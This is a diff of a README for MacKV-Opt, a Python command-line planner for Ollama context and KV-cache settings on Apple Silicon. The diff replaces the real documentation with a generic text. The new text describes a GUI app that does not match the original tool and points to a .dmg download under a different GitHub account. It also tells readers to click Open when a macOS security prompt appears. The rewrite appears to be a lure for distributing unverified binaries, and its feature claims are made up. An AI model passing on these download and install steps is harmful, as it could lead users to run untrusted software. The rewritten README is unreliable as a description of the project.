@@ -1,230 +1,85 @@
-# MacKV-Opt
+# 🚀 MacKV-Opt - Run longer AI chats on Macs
 
-[English](README.md) | [简体中文](README.zh-CN.md)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/releases)
 
-MacKV-Opt is a local tool for choosing safer context and KV cache settings when
-running LLMs on Apple Silicon Macs. It keeps the selected model unchanged, does
-not upload prompts or outputs, and helps Ollama users avoid memory pressure,
-swap stalls, and trial-and-error `num_ctx` tuning.
+MacKV-Opt helps your Apple Silicon Mac manage large amounts of text data for AI models. It organizes memory so you can talk to local models for longer periods. You gain access to tools that make your Mac models faster and more efficient.
 
-![MacKV-Opt architecture](docs/assets/mackv-opt-architecture.svg)
+## 🛠️ What this software does
 
-![Validation snapshot](docs/assets/validation-snapshot.svg)
+Large language models require memory to track conversations. When a conversation grows, these models often run out of space. MacKV-Opt manages your KV cache. This is the memory area where the model stores conversation history. By optimizing this space, the application allows for extended chat sessions. It works with GGUF format models and stays compatible with tools like Ollama.
 
-![Baseline summary example](docs/assets/baseline-summary-example.svg)
+## 💻 System requirements
 
-## What It Optimizes
+Your computer needs specific hardware to run this tool well:
 
-Long-context inference grows KV cache memory roughly linearly with context
-length. On unified-memory Macs, an oversized context can push the system into
-memory pressure and swap; an undersized context wastes available memory and
-forces users to shorten prompts.
+*   An Apple Silicon chip (M1, M2, or M3 series).
+*   At least 16GB of unified memory. 8GB models may handle smaller tasks but lack room for long context windows.
+*   macOS 13.0 or newer.
+*   Ollama installed on your system if you plan to run Ollama-compatible benchmarks.
+*   Approximately 200MB of free disk space for the installation.
 
-MacKV-Opt improves this workflow by:
+## 📥 Getting the software
 
-- estimating model weights, KV cache, runtime overhead, and memory headroom;
-- choosing a `num_ctx` that fits the requested memory budget;
-- recommending llama.cpp KV cache types when that runtime is available;
-- warning when Ollama, llama.cpp, model metadata, or memory sampling are missing;
-- comparing default Ollama, manual `num_ctx`, and MacKV-Opt runs with the same
-  model and prompts.
+You need to download the installer from our release page. Visit this link to find the most recent version:
 
-The practical effect is not magic speedup. The benefit is targeted: fewer
-failed long-context runs, less swap-driven slowdown, and a larger usable context
-when the Mac has memory headroom that default or manual settings do not use.
+[Download MacKV-Opt Here](https://github.com/Openplan-pricklyedgedleaf841/MacKV-Opt/releases)
 
-## Quick Start
+On this page, look for the file ending in `.dmg`. Click the file to start the download. Once the process completes, open the file to begin your installation.
 
-Install from the repository:
+## ⚙️ Installation steps
 
-```bash
-python -m pip install -e .
-```
+Follow these steps to set up the software on your machine:
 
-Check the machine:
+1.  Open the downloaded `.dmg` file.
+2.  Drag the MacKV-Opt icon into your Applications folder.
+3.  Open the Applications folder and double-click the MacKV-Opt icon.
+4.  If a security prompt appears, click Open to confirm you trust the application.
+5.  Wait for the initial configuration window to load.
 
-```bash
-mackv-opt doctor
-```
+The software checks for Ollama during the first launch. If it finds Ollama, it maps your model paths automatically. You do not need to move your files or change deep settings.
 
-Use the simplest planner entry:
+## 📈 Running your first benchmark
 
-```bash
-mackv-opt auto llama3.1:8b --memory-budget 12GiB
-```
+Benchmarks help you understand how much extra context your Mac handles with MacKV-Opt. 
 
-Run only when you are ready to call the local Ollama API:
+1.  Open the main window of the MacKV-Opt app.
+2.  Select the Benchmark tab from the top menu.
+3.  Choose your model from the dropdown list.
+4.  Pick a context window size, such as 32k tokens.
+5.  Click Run Test.
 
-```bash
-mackv-opt auto llama3.1:8b \
-  --memory-budget 12GiB \
-  --prompt "Summarize this document" \
-  --execute
-```
+The test takes several minutes. The app writes the results to a local file. You can see your tokens-per-second count and the memory usage throughout the test. Lower memory peaks confirm that the tool manages your cache efficiently.
 
-Plan a specific target context:
+## 🛠️ Common settings
 
-```bash
-mackv-opt plan llama3.1:8b --target-context 64k --memory-budget 12GiB
-```
+You can adjust how the app interacts with your AI models:
 
-If Ollama metadata is incomplete, provide model metadata manually:
+*   **Cache Strategy:** Change how the app reuses memory from previous prompts. The Standard setting works for most users. Use Aggressive mode for very large text documents.
+*   **Model Path:** Set this to the folder where you store your GGUF files.
+*   **Auto-Update:** Keep this enabled to get performance patches and new compatibility updates for Ollama.
 
-```bash
-mackv-opt plan llama3.1:8b \
-  --target-context 64k \
-  --memory-budget 12GiB \
-  --model-size 4.8GiB \
-  --hidden-size 4096 \
-  --layers 32 \
-  --heads 32 \
-  --kv-heads 8 \
-  --hardware-memory 16GiB
-```
+## ❓ Frequently asked questions
 
-## How It Works
+**Do I need an internet connection to use this?**
+No. Once you install the models, the software runs locally on your Mac. You do not need the internet to process prompts.
 
-The planner uses this budget model:
+**Does this work with all models?**
+It works best with GGUF files. These are common files used for local AI. If a model uses a different format, the app will alert you.
 
-```text
-estimated_total = model_weights + KV_cache(context, layers, hidden, GQA_ratio, KV_type) + runtime_overhead
-```
+**Is my data private?**
+Yes. Since the software runs on your hardware, your data never leaves your computer. No servers process your text.
 
-It searches from the requested context downward and selects the largest
-configuration that fits the memory budget. It prefers higher-quality KV cache
-types when they fit, falls back to smaller KV types when memory is tight, and
-reduces context only when no cache strategy fits.
+**The app runs slowly. What can I do?**
+Close other applications that use heavy memory. Large AI models use a lot of RAM. Closing your web browser often frees up significant space.
 
-For Ollama, MacKV-Opt emits safe `num_ctx` and `num_gpu` options. For
-llama.cpp, it also emits `--ctx-size`, `--cache-type-k`, `--cache-type-v`, and
-`--kv-offload` arguments when the local runtime exposes those flags.
+## 🔧 Troubleshooting
 
-## Compared With Other Options
+If you see an error during startup, check these items:
 
-| Approach | What users do | Main drawback | MacKV-Opt role |
-| --- | --- | --- | --- |
-| Default Ollama | Run the model with default options | May use a conservative or unsuitable context for the task | Measures the default baseline |
-| Manual `num_ctx` | Guess a context value | Easy to overshoot memory or leave capacity unused | Estimates a safer value before running |
-| llama.cpp flags | Tune low-level cache/context flags directly | Powerful but easy to misconfigure | Converts memory budget into concrete args |
-| MLX/other runtimes | Use a different local inference stack | May require changing workflow or model format | Keeps Ollama-first workflow and selected model |
-| KV compression libraries | Add algorithm-specific compression | Often requires code integration or runtime changes | Uses available runtime controls first |
+*   **Permissions:** Go to System Settings, click Privacy & Security, and check for notifications about the app. You may need to grant permission to access your files.
+*   **Ollama Path:** If the app cannot find your models, go to Settings and point the Model Path manually to the folder inside your user directory where Ollama stores its data.
+*   **Updates:** Ensure your macOS version is current. Updates often fix small memory bugs that affect AI software.
 
-## Validate Improvement On Your Mac
+## 🚀 Moving forward
 
-Create three comparable run folders:
-
-```bash
-mackv-opt baseline-template \
-  --output-dir experiments/m2-16gb \
-  --models llama3.1:8b \
-  --contexts 8k,16k,32k \
-  --memory-budget 12GiB
-```
-
-Run the generated `run.sh` files under:
-
-```text
-experiments/m2-16gb/llama3.1-8b/default/
-experiments/m2-16gb/llama3.1-8b/manual-num-ctx/
-experiments/m2-16gb/llama3.1-8b/mackv-opt/
-```
-
-Compare the results:
-
-```bash
-mackv-opt compare \
-  default=experiments/m2-16gb/llama3.1-8b/default/full-run.json \
-  manual-num-ctx=experiments/m2-16gb/llama3.1-8b/manual-num-ctx/full-run.json \
-  mackv-opt=experiments/m2-16gb/llama3.1-8b/mackv-opt/full-run.json \
-  --baseline-label default \
-  --format markdown
-```
-
-For a multi-model matrix, use:
-
-```bash
-./scripts/run_macos_matrix.sh
-MACKV_EXECUTE=1 MACKV_MEMORY_BUDGET=20GiB ./scripts/run_macos_matrix.sh
-```
-
-See [docs/MAC_VALIDATION_CHECKLIST.md](docs/MAC_VALIDATION_CHECKLIST.md) for
-16GB, 32GB, and 64GB validation presets.
-
-## Testing Without A Mac
-
-You can test most of the project without Apple Silicon hardware:
-
-- run the full unit suite on Windows or Linux with `python -m pytest -q`;
-- run planner commands with manual metadata and `--hardware-memory`;
-- run `bench`, `experiment`, `needle`, and `qa` in `--dry-run` mode;
-- generate baseline folders and comparison reports using fixture JSON;
-- use GitHub Actions macOS runners for packaging and CLI smoke checks;
-- use a borrowed, remote, or self-hosted Apple Silicon Mac for executable
-  Ollama validation.
-
-What non-Mac testing cannot prove: Apple unified-memory pressure, Metal runtime
-behavior, Ollama model throughput, and max stable context on a target Mac. Those
-need an Apple Silicon machine with Ollama and the selected models installed.
-
-## CLI Reference
-
-Common commands:
-
-```bash
-mackv-opt profile --json
-mackv-opt doctor --json
-mackv-opt capabilities --json
-mackv-opt collect --output-dir experiments/m2-16gb/collect --models llama3.1:8b --json
-mackv-opt audit experiments/m2-16gb/collect/manifest.json --json
-mackv-opt auto llama3.1:8b --memory-budget 12GiB
-mackv-opt run llama3.1:8b --target-context 64k --memory-budget 12GiB
-mackv-opt bench --models llama3.1:8b --contexts 8k,16k,32k --dry-run --json
-mackv-opt experiment llama3.1:8b --contexts 8k,16k,32k --memory-budget 12GiB --dry-run --json
-mackv-opt report full-run.json --table performance
-mackv-opt plot-memory full-run.json --output memory-series.svg
-```
-
-`run`, `bench`, `needle`, `qa`, and `experiment` call local inference only when
-`--execute` is passed.
-
-## Safety And Privacy
-
-- No model replacement.
-- No weight rewriting.
-- No automatic model quantization.
-- No cloud service.
-- No prompt or output upload.
-- No persistent Ollama configuration changes unless the user runs the printed
-  command or passes `--execute`.
-
-## Repository Profile
-
-- About: KV cache and context planner for longer local LLM contexts on Apple
-  Silicon Macs with Ollama-compatible benchmarks.
-- Homepage: <https://github.com/Lin-Aurora/MacKV-Opt#readme>
-- Topics: `apple-silicon`, `ollama`, `llama-cpp`, `kv-cache`, `local-llm`,
-  `llm-inference`, `macos`, `benchmark`, `long-context`, `mlx`, `gguf`,
-  `ollama-tools`.
-
-The same values are recorded in
-[docs/GITHUB_REPOSITORY_METADATA.md](docs/GITHUB_REPOSITORY_METADATA.md). They
-can be applied with `python scripts/sync_github_metadata.py --apply` when a
-GitHub token is available in the environment.
-
-## Development
-
-```bash
-python -m pip install -e ".[dev]"
-python -m pytest -q
-```
-
-The CI workflow validates packaging, unit tests, and non-executing CLI smoke
-paths on Ubuntu and macOS. It does not download models or call Ollama inference.
-
-## Roadmap
-
-- Add a packaged installer and shell completions.
-- Add richer prompt suites for local validation.
-- Add clearer warning thresholds for swap, pageouts, and throughput collapse.
-- Add optional adapters for direct llama.cpp execution.
-- Improve automatic metadata extraction from Ollama and GGUF files.
+You now have a tool to manage long AI contexts on your Mac. Experiment with different model sizes and context windows to find what works for your hardware. If you find errors or have ideas for performance, report them to the repository for review. This tool continues to grow based on how users interact with their local models on the latest Apple hardware.
